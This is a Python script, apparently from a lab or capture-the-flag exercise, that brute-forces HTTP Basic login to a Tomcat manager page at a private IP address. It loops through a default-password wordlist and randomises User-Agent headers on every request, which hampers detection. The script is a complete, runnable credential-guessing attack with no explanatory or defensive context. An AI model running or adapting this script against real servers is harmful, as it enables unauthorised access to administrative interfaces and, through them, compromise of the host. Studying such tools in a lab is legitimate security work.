#!/usr/bin/python3
# coding: utf-8

import requests
import threading
import base64
import sys
from fake_useragent import UserAgent
from pwn import log


def strToBase64(str):
    strToByte = str.encode("ascii")
    byteToBase64 = base64.b64encode(strToByte)
    return byteToBase64


def credentialIsGood(text):
    if (
        "<title>401 Unauthorized</title>" in text
        or "<title>403 Access Denied</title>" in text
    ):
        return False
    else:
        return True


def bruteForce(credential):
    global info
    info.status(credential)
    url = "http://10.10.10.95:8080/manager/html"
    credentialEncodedInBase64 = strToBase64(credential)
    userAgent = UserAgent().random
    headers = {
        "Authorization": f"Basic {credentialEncodedInBase64.decode()}",
        "User-Agent": userAgent,
    }

    r = requests.get(url, headers=headers)
    if credentialIsGood(r.text):
        info.success(f"{credential} found!")
        sys.exit(0)


def getCredentialsList():
    credentials = []
    with open("tomcat-betterdefaultpasslist.txt") as wordlist:
        for credential in wordlist.readlines():
            credentials.append(credential.strip())
        return credentials


def main():
    global info
    info = log.progress("Testing credential")
    credentials = getCredentialsList()
    for credential in credentials:
        bruteForce(credential)


main()
